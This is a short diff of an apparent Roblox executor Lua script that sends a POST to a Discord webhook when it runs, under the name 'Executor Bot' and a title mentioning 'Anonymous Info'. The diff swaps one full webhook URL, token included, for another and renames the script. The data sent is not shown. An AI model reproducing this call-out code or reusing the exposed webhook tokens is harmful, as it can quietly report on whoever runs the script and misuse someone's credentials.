@@ -12,7 +12,7 @@ local req = (syn and syn.request) or (http and http.request) or request
 
 if req then
 	req({
-		Url = "https://discord.com/api/webhooks/1401191906792439851/WhX-CKdoN1OmyfVMrbrSDaMxY05vT29OtkWNOcLx_b5UnX9yLb0W4WUeeYrWRENvkJUb",
+		Url = "https://discord.com/api/webhooks/1409878596235034744/s-t9m0rZnwbwywIKrany77utEoRA6YS7dfjXHOhPHl6TrpqR_y2UpAhl6aW60HJGusV3",
 		Method = "POST",
 		Headers = {
 			["Content-Type"] = "application/json"
@@ -21,7 +21,7 @@ if req then
 			username = "Executor Bot",
 			embeds = {
 				{
-					title = "Script executed : Event Claimer Script : Anonymous Info",
+					title = "Script executed : Seized : Anonymous Info",
 					color = 0,
 					fields = {
 						{
